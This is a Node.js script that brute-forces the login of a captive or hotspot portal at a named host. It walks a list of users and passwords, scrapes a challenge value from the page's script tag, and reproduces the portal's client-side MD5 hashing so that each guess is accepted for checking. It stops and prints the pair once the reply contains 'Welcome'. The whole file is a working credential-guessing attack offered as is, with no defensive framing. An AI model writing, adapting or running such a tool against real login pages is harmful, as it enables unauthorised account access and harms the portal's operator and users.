let cheerio = require('cheerio'),
    request = require('sync-request'),
    md5 = require('./md5'),
    dataMapHex=require('./hex'),
    data = require('./data');

var url='http://localjuve.com';

for (let i = 0; i < data.users.length; i++) {
    for (let x = 0; x < data.passwords.length; x++) {
        main(data.users[i],data.passwords[x]);
    }
}

function main(user,password){

    console.log(user+"--"+password);
    let passEncrypted=(encrypt_data(extractNumbers(makeRequest(url)),password));
    let bodyHtml = (makePost(user,passEncrypted));

    if (bodyHtml.includes('Welcome')) {
         console.log('Valid user: '+user+"--"+password);
         process.exit();
     }
}

function makeRequest(url) {
    let response = request('GET', url);
    let html=response.getBody('utf8');
    let $ = cheerio.load(html);
    return $('script').get()[1].children[0].data;
}

function extractNumbers(dataFunctionLogin) {
    let numExtract = dataFunctionLogin.replace(/[^0-9]/g,'');
    let numbers=[];
    let count=1;
    let number='';
    while(count<numExtract.length){
        number += numExtract.charAt(count++);
        number += numExtract.charAt(count++);
        number += numExtract.charAt(count++);
        numbers.push(number);
        number='';
    }
    // return array numbers
    return numbers;
}

function encrypt_data(numbers,password){
    //numbers is array

    let i = 0
    let dataHex = new Array();
    while(i<numbers.length){
        dataHex.push(dataMapHex.mapHex.get(numbers[i]));
        i++;
    }
    
    return md5.hexMD5(dataHex[0]+password+dataHex[1]+dataHex[2]+dataHex[3]+dataHex[4]+dataHex[5]+dataHex[6]+dataHex[7]+dataHex[8]+dataHex[9]+dataHex[10]+dataHex[11]+dataHex[12]+dataHex[13]+dataHex[14]+dataHex[15]+dataHex[16]);
}

function makePost(user,passEncrypted) {
    let response = request('POST',url,
        {
           headers:{'Content-Type':'application/x-www-form-urlencoded'},
           body:'username='+user+'&'+'password='+passEncrypted+'&dst=&popup=true'
        }
    );

    return response.getBody('utf8');
}